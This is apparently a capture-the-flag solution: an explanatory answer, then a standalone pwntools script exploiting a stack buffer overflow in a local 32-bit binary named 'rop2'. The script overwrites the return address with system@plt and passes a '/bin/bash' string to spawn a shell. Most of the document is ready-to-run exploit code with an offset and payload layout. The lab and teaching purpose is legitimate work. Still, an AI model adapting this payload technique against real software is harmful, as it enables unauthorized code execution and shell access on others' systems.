("To solve this challenge using **pwntools**, we'll exploit the buffer "
 'overflow in the `vulnerable_function` to overwrite the return address and '
 'execute the `system` function with `/bin/bash` as an argument. This will '
 'spawn a shell, allowing us to interact with the program at a deeper level.\n'
 '\n'
 '**Solution Steps:**\n'
 '\n'
 '1. **Calculate the Offset:** Determine the number of bytes needed to reach '
 'the return address (in this case, 140 bytes).\n'
 '2. **Find Necessary Addresses:**\n'
 '   - Address of the `system` function in the Procedure Linkage Table (PLT).\n'
 "   - Address of the string `/bin/bash` within the binary's data section.\n"
 '3. **Craft the Payload:** Create a payload that overflows the buffer, '
 "overwrites the return address with `system`'s address, and places the "
 'address of `/bin/bash` on the stack as an argument.\n'
 '4. **Send the Payload:** Use pwntools to send the payload to the binary.\n'
 '5. **Gain Interactive Shell:** Interact with the program to utilize the '
 'spawned shell.\n'
 '\n'
 '**Imports Needed:**\n'
 '\n'
 '```python\n'
 'from pwn import *\n'
 '```\n'
 '\n'
 '**Complete Code:**\n'
 '\n'
 '```python\n'
 'from pwn import *\n'
 '\n'
 '# Set up pwntools context for 32-bit Linux binary\n'
 "context(os='linux', arch='i386', log_level='info')\n"
 '\n'
 '# Path to the binary\n'
 "binary = './pwn/stack/rop-2/rop2'\n"
 '\n'
 '# Load the ELF binary\n'
 'elf = ELF(binary)\n'
 '\n'
 '# Start the process\n'
 'p = process(binary)\n'
 '\n'
 '# Calculate the offset to the return address (140 bytes)\n'
 'offset = 140\n'
 '\n'
 "# Find the address of 'system' function\n"
 "system_plt = elf.plt['system']\n"
 'log.info(f"system@plt address: {hex(system_plt)}")\n'
 '\n'
 "# Find the address of the '/bin/bash' string\n"
 "binbash = next(elf.search(b'/bin/bash'))\n"
 'log.info(f"\'/bin/bash\' string address: {hex(binbash)}")\n'
 '\n'
 '# Build the payload\n'
 "payload = b'A' * offset                # Overflow buffer to reach return "
 'address\n'
 'payload += p32(system_plt)             # Overwrite return address with '
 "'system'\n"
 "payload += b'BBBB'                     # Placeholder for return address "
 "after 'system' (can be anything)\n"
 "payload += p32(binbash)                # Argument to 'system' function "
 "('/bin/bash' address)\n"
 '\n'
 '# Send the payload\n'
 'p.sendline(payload)\n'
 '\n'
 '# Interact with the spawned shell\n'
 'p.interactive()\n'
 '```\n'
 '\n'
 '**Explanation:**\n'
 '\n'
 '- **Context Setup:** Specifies the target OS and architecture to ensure '
 'pwntools behaves correctly.\n'
 '- **ELF Loading:** Loads the binary, allowing us to access symbols and '
 'addresses.\n'
 '- **Offset Calculation:** The buffer is 136 bytes, and including the saved '
 'base pointer (4 bytes), the total offset to the return address is 140 '
 'bytes.\n'
 '- **Finding Addresses:**\n'
 '  - `system_plt` is the address of the `system` function obtained from the '
 'PLT.\n'
 '  - `binbash` is the address of the `/bin/bash` string found within the '
 'binary.\n'
 '- **Payload Construction:**\n'
 '  - Fills the buffer with padding to reach the return address.\n'
 '  - Overwrites the return address with `system_plt`.\n'
 '  - Adds a placeholder for the return address after `system` (not used but '
 'required).\n'
 '  - Appends the address of `/bin/bash` as the argument to `system`.\n'
 '- **Sending Payload and Interaction:**\n'
 '  - Sends the crafted payload to the process.\n'
 '  - Switches to interactive mode to interact with the spawned shell.\n'
 '\n'
 '**Note:** Ensure that the binary is set as executable and that all paths are '
 'correct. Running this script will give you a shell with the same privileges '
 'as the binary.')


from pwn import *

# Set up pwntools context for 32-bit Linux binary
context(os='linux', arch='i386', log_level='info')

# Path to the binary
binary = './pwn/stack/rop-2/rop2'

# Load the ELF binary
elf = ELF(binary)

# Start the process
p = process(binary)

# Calculate the offset to the return address (140 bytes)
offset = 140

# Find the address of 'system' function in the PLT
system_plt = elf.plt['system']
log.info(f"system@plt address: {hex(system_plt)}")

# Find the address of the '/bin/bash' string in the binary's data section
binbash = next(elf.search(b'/bin/bash'))
log.info(f"/bin/bash string address: {hex(binbash)}")

# Build the payload
payload = b'A' * offset                # Overflow buffer to reach return address
payload += p32(system_plt)             # Overwrite return address with system
payload += b'BBBB'
payload += p32(binbash)                # Argument to system function ('/bin/bash' address)

# Send the payload
p.sendline(payload)

# Interact with the spawned shell
p.interactive()